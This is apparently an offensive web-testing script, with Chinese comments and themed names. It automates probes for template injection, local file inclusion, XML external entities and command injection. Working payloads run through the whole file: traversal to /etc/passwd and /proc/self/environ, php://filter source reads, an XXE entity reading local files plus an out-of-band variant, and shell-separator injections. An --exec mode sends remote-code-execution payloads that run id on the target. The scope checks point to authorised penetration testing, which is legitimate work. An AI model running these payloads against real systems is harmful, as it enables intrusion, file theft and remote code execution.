#!/usr/bin/env python3
"""大爱仙尊模板/包含/实体/命令注入探针。

SSTI 用 1337*7=9359，不用 49。Twig/Jinja 用 {{7*'7'}} 分流（7777777 vs 49）。
LFI 看 passwd / php://filter。XXE 看实体回显。命令注入看 se9359 标记。
授权内 --exec 才发 id/whoami。

示例:
  python3 炼蛊房/tpl_inject_probe.py ssti --url 'https://授权/?name=x' --param name --case <案>
  python3 炼蛊房/tpl_inject_probe.py lfi --url 'https://授权/?file=1' --param file --case <案>
  python3 炼蛊房/tpl_inject_probe.py xxe --url 'https://授权/api/import' --case <案>
  python3 炼蛊房/tpl_inject_probe.py cmdi --url 'https://授权/?host=1' --param host --case <案>
  python3 炼蛊房/tpl_inject_probe.py --self-test
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

OPS = __import__("pathlib").Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from probe_http import get, post, session  # noqa: E402
from scope_lib import require_in_scope, write_probe_json  # noqa: E402

SSTI_A, SSTI_B = 9359, 10696  # 1337*7 / 1337*8
PASSWD_RX = re.compile(r"root:[x*]:0:0:")
MARKER = "se9359"

SSTI_PAIRS = (
    ("jinja_twig", "{{%s*7}}", "{{%s*8}}", 1337),
    ("freemarker", "${%s*7}", "${%s*8}", 1337),
    ("erb", "<%= %s*7 %>", "<%= %s*8 %>", 1337),
)

# 算术成立后再认族：Twig 字符串重复，Jinja 当数字乘
TWIG_VS_JINJA = "{{7*'7'}}"

LFI_PAYLOADS = (
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "c:\\windows\\win.ini",
    "/proc/self/environ",
)

CMDI_PAYLOADS = (
    f";echo {MARKER}",
    f"|echo {MARKER}",
    f"&echo {MARKER}",
    f"`echo {MARKER}`",
    f"$(echo {MARKER})",
    f"%0aecho {MARKER}",
)

XXE_FILE = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)


def with_param(url: str, name: str, value: str) -> str:
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[name] = value
    return urlunparse(u._replace(query=urlencode(q, safe="")))


def distinguish_twig(body: str) -> str:
    if "7777777" in body:
        return "twig"
    if re.search(r"(?<!\d)49(?!\d)", body):
        return "jinja"
    return ""


def ssti_rce_payloads(cmd: str = "id") -> dict[str, str]:
    """算术过闸后用。完整族来自 rce_forge，不赌 subclasses 下标。"""
    from rce_forge import render_family

    out: dict[str, str] = {}
    for fam in ("ssti-jinja", "ssti-twig", "ssti-freemarker", "ssti-erb"):
        for row in render_family(fam, cmd):
            out[row["id"]] = row["body"]
    return out


def probe_ssti(url: str, param: str, *, exec_rce: bool) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    out: dict[str, Any] = {"url": url, "param": param, "hits": [], "engine": "", "rce": []}
    for name, a_fmt, b_fmt, n in SSTI_PAIRS:
        a = get(with_param(url, param, a_fmt % n), sess=s, timeout=12)
        b = get(with_param(url, param, b_fmt % n), sess=s, timeout=12)
        ta, tb = a.text or "", b.text or ""
        if str(SSTI_A) in ta and str(SSTI_B) in tb and str(SSTI_A) not in tb:
            out["hits"].append(name)
            if name == "jinja_twig":
                d = get(with_param(url, param, TWIG_VS_JINJA), sess=s, timeout=12)
                out["engine"] = distinguish_twig(d.text or "") or "jinja_or_twig"
            else:
                out["engine"] = name
            break
    if exec_rce and out["hits"]:
        for k, pay in ssti_rce_payloads().items():
            r = get(with_param(url, param, pay), sess=s, timeout=15)
            text = r.text or ""
            if "uid=" in text or "gid=" in text:
                out["rce"].append({"kind": k, "preview": text[:200]})
    out["l2"] = bool(out["hits"])
    out["l3"] = bool(out["rce"])
    return out


def probe_lfi(url: str, param: str) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    hits = []
    for pay in LFI_PAYLOADS:
        r = get(with_param(url, param, pay), sess=s, timeout=12)
        body = r.text or ""
        if PASSWD_RX.search(body) or "[fonts]" in body.lower() or "PATH=" in body:
            hits.append({"payload": pay, "signal": "file-read", "len": len(body)})
            break
        compact = re.sub(r"\s+", "", body)
        if "php://filter" in pay and re.search(r"PD9waH[A-Za-z0-9+/=]{8,}", compact):
            hits.append({"payload": pay, "signal": "php-filter", "len": len(body)})
            break
    return {"url": url, "param": param, "hits": hits, "l2": bool(hits)}


def probe_xxe(url: str, *, oob: str = "") -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    r = post(url, sess=s, data=XXE_FILE.encode(), headers={"Content-Type": "application/xml"}, timeout=12)
    body = r.text or ""
    hit = bool(PASSWD_RX.search(body))
    rec: dict[str, Any] = {
        "url": url,
        "status": r.status,
        "l2": hit,
        "l1": (not hit) and ("entity" in body.lower() or "DOCTYPE" in body),
        "preview": body[:240],
    }
    if oob:
        xml = (
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "'
            + oob
            + '">%d;]><r>x</r>'
        )
        rec["oob"] = post(
            url, sess=s, data=xml.encode(), headers={"Content-Type": "application/xml"}, timeout=12
        ).status
    return rec


def probe_cmdi(url: str, param: str, *, exec_rce: bool) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    hits = []
    for pay in CMDI_PAYLOADS:
        r = get(with_param(url, param, pay), sess=s, timeout=12)
        if MARKER in (r.text or ""):
            hits.append({"payload": pay})
            break
    rec: dict[str, Any] = {"url": url, "param": param, "hits": hits, "l2": bool(hits), "rce": []}
    if exec_rce and hits:
        from rce_forge import render_family

        for row in render_family("cmdi-unix", "id"):
            r = get(with_param(url, param, row["body"]), sess=s, timeout=15)
            if "uid=" in (r.text or "") or "gid=" in (r.text or ""):
                rec["rce"].append({"id": row["id"], "preview": (r.text or "")[:200]})
                rec["l3"] = True
                break
    return rec


def run_self_test() -> list[str]:
    fails: list[str] = []
    if 1337 * 7 != SSTI_A or 1337 * 8 != SSTI_B:
        fails.append("arith")
    if distinguish_twig("x7777777y") != "twig":
        fails.append("twig")
    if distinguish_twig("answer 49 done") != "jinja":
        fails.append("jinja")
    u = with_param("https://x.test/?name=a", "name", "{{1337*7}}")
    if "1337" not in u:
        fails.append("param")
    rce = ssti_rce_payloads()
    blob = "\n".join(rce.values())
    if "cycler" not in blob or "sys" not in blob or "Execute" not in blob:
        fails.append("rce-payload")
    if MARKER not in CMDI_PAYLOADS[0]:
        fails.append("cmdi")
    return fails


def _dump(data: dict[str, Any], case: str, name: str) -> None:
    data["playbook"] = {
        "ssti": "传承/全力以赴.md",
        "lfi": "传承/开卷.md",
        "xxe": "传承/噬文.md",
        "cmdi": "传承/奴道驱使.md",
    }.get(name, "")
    path = write_probe_json(data, case=case, case_subdir="tpl_inject", filename=f"{name}.json")
    print(json.dumps({**{k: data[k] for k in data if k != "preview"}, "out": str(path)}, ensure_ascii=False))


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊 SSTI/LFI/XXE/命令注入")
    ap.add_argument("--self-test", action="store_true")
    sub = ap.add_subparsers(dest="cmd")

    def add_common(p: argparse.ArgumentParser, *, need_param: bool) -> None:
        p.add_argument("--url", required=True)
        if need_param:
            p.add_argument("--param", required=True)
        p.add_argument("--case", default="")
        p.add_argument("--exec", action="store_true", help="授权内发 id/whoami")

    add_common(sub.add_parser("ssti"), need_param=True)
    add_common(sub.add_parser("lfi"), need_param=True)
    p_x = sub.add_parser("xxe")
    p_x.add_argument("--url", required=True)
    p_x.add_argument("--case", default="")
    p_x.add_argument("--oob", default="")
    add_common(sub.add_parser("cmdi"), need_param=True)

    args = ap.parse_args()
    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print("self-test ok  tpl_inject")
        return 0

    if args.cmd == "ssti":
        data = probe_ssti(args.url, args.param, exec_rce=args.exec)
        _dump(data, args.case, "ssti")
        return 0 if data.get("l2") else 1
    if args.cmd == "lfi":
        data = probe_lfi(args.url, args.param)
        _dump(data, args.case, "lfi")
        return 0 if data.get("l2") else 1
    if args.cmd == "xxe":
        data = probe_xxe(args.url, oob=args.oob)
        _dump(data, args.case, "xxe")
        return 0 if data.get("l2") or data.get("l1") else 1
    if args.cmd == "cmdi":
        data = probe_cmdi(args.url, args.param, exec_rce=args.exec)
        _dump(data, args.case, "cmdi")
        return 0 if data.get("l2") else 1
    ap.error("需要 ssti / lfi / xxe / cmdi / --self-test")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
